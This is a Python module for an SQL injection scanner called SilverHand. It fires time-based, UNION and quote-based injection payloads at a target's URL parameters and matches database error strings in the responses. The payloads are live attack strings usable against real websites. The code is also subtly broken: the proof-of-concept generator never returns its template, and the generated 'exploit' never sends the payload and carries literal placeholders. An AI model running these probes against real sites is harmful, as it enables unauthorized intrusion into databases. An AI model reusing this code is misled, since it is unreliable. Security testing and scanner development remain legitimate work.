"""
SilverHand SQL Scanner - Advanced SQL Injection detection module
Detects SQLi vulnerabilities with PoC generation
"""

import re
import requests
from urllib.parse import urljoin, urlparse
from typing import Dict, List, Any, Optional

class SQLScanner:
    """Advanced SQL Injection vulnerability scanner"""
    
    def __init__(self):
        self.error_patterns = [
            "you have an error in your sql syntax",
            "warning: mysql_fetch_array()",
            "unclosed quotation mark after the character string",
            "quoted string not properly terminated",
            "sql syntax error",
            "mysql_num_rows()",
            "microsoft ole db provider for odbc drivers error",
            "invalid-sintax",
            "unclosed quotation mark",
            "mssql_query()",
            "command not properly ended",
            "odbc microsoft access driver error",
            "user-defined error message",
            "invalid procedure call or argument"
        ]
        
        self.time_based_payloads = [
            "AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
            "OR (SELECT * FROM (SELECT(SLEEP(5)))a)",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "\' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1;SELECT SLEEP(5)--"
        ]
        
        self.union_payloads = [
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT 1,2,3,4,5--"
        ]

    def scan(self, target: str, config: Dict[str, Any]) -> Dict[str, Any]:
        """Scan target for SQL injection vulnerabilities"""
        
        print(f"[+] Starting SQL Injection scan on {target}")
        
        vulnerabilities = []
        
        # Test URL parameters
        if '?' in target:
            base_url = target.split('?')[0]
            params = target.split('?')[1].split('&') if len(target.split('?')) > 1 else []
            
            for param in params:
                if '=' in param:
                    param_name = param.split('=')[0]
                    
                    # Test error-based SQLi
                    error_based_vuln = self._test_error_based(base_url, param_name)
                    if error_based_vuln:
                        vulnerabilities.append(error_based_vuln)
                        continue # Move to next param if found
                    
                    # Test time-based SQLi
                    time_based_vuln = self._test_time_based(base_url, param_name)
                    if time_based_vuln:
                        vulnerabilities.append(time_based_vuln)
                        continue
                    
                    # Test UNION-based SQLi
                    union_based_vuln = self._test_union_based(base_url, param_name)
                    if union_based_vuln:
                        vulnerabilities.append(union_based_vuln)

        return {
            'vulnerabilities': vulnerabilities,
            'total_found': len(vulnerabilities),
            'scan_type': 'sql',
            'target': target
        }

    def _test_error_based(self, base_url: str, param: str) -> Optional[Dict[str, Any]]:
        """Test for error-based SQL injection"""
        
        payloads = ["'", '" ', "\\'"]
        
        for payload in payloads:
            test_url = f"{base_url}?{param}={payload}"
            
            try:
                response = requests.get(test_url, timeout=10)
                
                for error in self.error_patterns:
                    if error in response.text.lower():
                        return {
                            'type': 'sql',
                            'severity': 'high',
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'description': f'Error-based SQL injection in parameter {param}',
                            'recommendation': 'Use parameterized queries and input validation',
                            'proof': f'Error message found: {error}'
                        }
                        
            except Exception as e:
                print(f"[-] Error in error-based SQLi test: {e}")
        
        return None

    def _test_time_based(self, base_url: str, param: str) -> Optional[Dict[str, Any]]:
        """Test for time-based blind SQL injection"""
        
        for payload in self.time_based_payloads:
            test_url = f"{base_url}?{param}={payload}"
            
            try:
                start_time = requests.get(test_url, timeout=10).elapsed.total_seconds()
                
                if start_time > 5: # 5 seconds delay
                    return {
                        'type': 'sql',
                        'severity': 'critical',
                        'url': test_url,
                        'parameter': param,
                        'payload': payload,
                        'description': f'Time-based blind SQL injection in parameter {param}',
                        'recommendation': 'Implement proper input validation and use secure queries',
                        'proof': 'Response delayed by >5 seconds'
                    }
                    
            except Exception as e:
                print(f"[-] Error in time-based SQLi test: {e}")
        
        return None

    def _test_union_based(self, base_url: str, param: str) -> Optional[Dict[str, Any]]:
        """Test for UNION-based SQL injection"""
        
        for payload in self.union_payloads:
            test_url = f"{base_url}?{param}={payload}"
            
            try:
                response = requests.get(test_url, timeout=10)
                
                # Check for common UNION injection indicators
                if "union select" in response.text.lower():
                    return {
                        'type': 'sql',
                        'severity': 'high',
                        'url': test_url,
                        'parameter': param,
                        'payload': payload,
                        'description': f'UNION-based SQL injection in parameter {param}',
                        'recommendation': 'Use parameterized queries and validate input',
                        'proof': 'UNION SELECT statement reflected in response'
                    }
                    
            except Exception as e:
                print(f"[-] Error in UNION-based SQLi test: {e}")
        
        return None

    def generate_poc(self, vulnerability: Dict[str, Any]) -> str:
        """Generate PoC for SQL injection"""
        
        target = vulnerability.get('url', '')
        param = vulnerability.get('parameter', 'input')
        payload = vulnerability.get('payload', '')
        
        poc_code = f"""# SQL Injection PoC
# Target: {target}
# Parameter: {param}
# Payload: {payload}

import requests

def exploit_sql():
    \"\"\"Exploit SQL injection\"\"\"
    
    target_url = \"{{target}}\"
    sql_payload = \"{{payload}}\"
    
    try:
        response = requests.get(target_url, timeout=10)
        
        if \"error\" in response.text.lower():
            print(\"[+] SQL Injection confirmed!\")
            print(f\"[+] Error message found in response\")
            return True
        else:
            print(\"[-] SQL Injection not confirmed\")
            return False
            
    except Exception as e:
        print(f\"[-] Error: {{e}}\")
        return False
"""

